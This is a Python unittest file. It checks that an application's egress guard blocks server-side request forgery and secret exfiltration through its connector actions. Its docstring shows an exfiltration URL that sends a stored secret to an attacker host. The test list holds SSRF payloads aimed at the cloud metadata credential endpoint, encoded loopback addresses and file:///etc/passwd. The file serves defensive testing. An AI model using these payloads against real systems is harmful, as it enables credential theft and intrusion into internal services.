"""The connector action path must not be an SSRF or secret-exfiltration primitive (T2.3).

executor._fire_action_request resolves {{secrets.*}} into the URL/headers/body and made the
request with NO host check. An untrusted author could point an action at 169.254.169.254 (steal
the instance IAM role) or at http://attacker/?k={{secrets.stripe_key}} (exfiltrate a stored
secret). The only guard lived on /actions/test, which does not inject secrets -- it protected the
harmless path and left the dangerous one open.
"""
from __future__ import annotations

import os
import sys
import unittest
from pathlib import Path
from unittest import mock

APP_ROOT = Path(__file__).resolve().parents[1]
if str(APP_ROOT) not in sys.path:
    sys.path.insert(0, str(APP_ROOT))

os.environ.setdefault("RULEMIND_CONFIG_KEY", "rulemind-test-key")

from app import egress  # noqa: E402


class RangeCheckTest(unittest.TestCase):
    BLOCKED = [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",  # cloud metadata
        "http://127.0.0.1:8080/internal",
        "http://127.1/",                 # short-form loopback a substring blocklist misses
        "http://2130706433/",            # integer-encoded 127.0.0.1
        "http://localhost/admin",
        "http://[::1]/",                 # IPv6 loopback
        "http://0.0.0.0/",
        "http://[::ffff:169.254.169.254]/",  # IPv4-mapped metadata
        "file:///etc/passwd",            # non-http scheme
        "gopher://127.0.0.1/",
    ]

    def test_all_internal_and_encoded_targets_are_blocked(self):
        for url in self.BLOCKED:
            with self.subTest(url=url):
                with self.assertRaises(egress.EgressBlocked, msg="allowed {0}".format(url)):
                    egress.vet_url(url)

    def test_a_public_host_is_allowed_and_pinned(self):
        # Mocked resolution -- the test must not depend on live DNS in CI. Pin returns an
        # IP-substituted URL with the original host preserved for Host/SNI.
        with mock.patch.object(egress.socket, "getaddrinfo",
                               return_value=[(2, 1, 6, "", ("93.184.216.34", 443))]):
            pinned = egress.build_pinned_request("https://example.com/webhook?x=1")
        self.assertEqual(pinned.sni_hostname, "example.com")
        self.assertTrue(pinned.host_header.startswith("example.com"))
        self.assertNotIn("example.com", pinned.url.split("//", 1)[1].split("/", 1)[0],
                         "the connection URL still contains the hostname -- not pinned to an IP")

    def test_a_private_dns_answer_is_blocked_even_for_a_public_name(self):
        """The A-record attack: a name the author controls that resolves to an internal IP."""
        with mock.patch.object(egress.socket, "getaddrinfo",
                               return_value=[(2, 1, 6, "", ("10.0.0.5", 80))]):
            with self.assertRaises(egress.EgressBlocked):
                egress.vet_url("http://evil.example.com/")

    def test_a_mixed_answer_with_one_internal_ip_is_blocked(self):
        with mock.patch.object(egress.socket, "getaddrinfo",
                               return_value=[(2, 1, 6, "", ("93.184.216.34", 80)),
                                             (2, 1, 6, "", ("127.0.0.1", 80))]):
            with self.assertRaises(egress.EgressBlocked):
                egress.vet_url("http://mixed.example.com/")


class AllowlistTest(unittest.TestCase):
    def tearDown(self):
        os.environ.pop("RULEMIND_ACTION_ALLOWED_HOSTS", None)

    def test_allowlist_denies_by_default(self):
        os.environ["RULEMIND_ACTION_ALLOWED_HOSTS"] = "api.partner.com"
        with self.assertRaises(egress.EgressBlocked):
            egress.vet_url("https://example.com/")

    def test_allowlist_permits_a_listed_host(self):
        os.environ["RULEMIND_ACTION_ALLOWED_HOSTS"] = "example.com, api.partner.com"
        # Still range-checked after the allowlist -- listing does not skip resolution.
        with mock.patch.object(egress.socket, "getaddrinfo",
                               return_value=[(2, 1, 6, "", ("93.184.216.34", 443))]):
            ip = egress.vet_url("https://example.com/")
        self.assertTrue(egress._is_public(ip))


class ClampTest(unittest.TestCase):
    def test_timeout_is_clamped(self):
        self.assertEqual(egress.clamp_timeout_ms(600000), egress.MAX_TIMEOUT_MS)
        self.assertEqual(egress.clamp_timeout_ms(-5), 1)
        self.assertEqual(egress.clamp_timeout_ms("nonsense"), 5000)

    def test_retries_are_clamped(self):
        self.assertEqual(egress.clamp_retries(10), egress.MAX_RETRIES)
        self.assertEqual(egress.clamp_retries(-1), 0)
        self.assertEqual(egress.clamp_retries("nonsense"), 0)


class ActionPathTest(unittest.TestCase):
    """End-to-end through _fire_action_request: the guard is on the secret-injecting path."""

    def setUp(self):
        import tempfile

        from app.executor import PolicyExecutor
        from app.storage import Storage

        self.tempdir = tempfile.TemporaryDirectory(ignore_cleanup_errors=True)
        self.storage = Storage(path=os.path.join(self.tempdir.name, "egress.db"))
        self.tenant = self.storage.default_tenant_id
        self.executor = PolicyExecutor(self.storage)

    def tearDown(self):
        self.tempdir.cleanup()

    def _fire(self, url):
        import asyncio

        from app.executor import ExecutionContext

        ctx = ExecutionContext(payload={}, tenant_id=self.tenant, policy_id="p", execution_id="e")
        step = {"id": "a1", "type": "action", "name": "probe"}
        config = {"url": url, "method": "POST", "onFailure": "continue", "bodyTemplate": {}}
        return asyncio.run(self.executor._fire_action_request(step, ctx, config))

    def test_metadata_endpoint_is_blocked_on_the_real_path(self):
        with mock.patch("httpx.AsyncClient") as client:
            result = self._fire("http://169.254.169.254/latest/meta-data/")
        self.assertFalse(result["success"])
        self.assertTrue(result.get("blocked"))
        client.assert_not_called()  # the request was never even attempted

    def test_a_blocked_action_is_recorded_as_an_error_event(self):
        self._fire("http://127.0.0.1/internal")
        events = self.storage.list_error_events(tenant_id=self.tenant)
        self.assertTrue([e for e in events if e.get("stage") == "action_error"],
                        "an SSRF block produced no alertable error event")


if __name__ == "__main__":
    unittest.main()
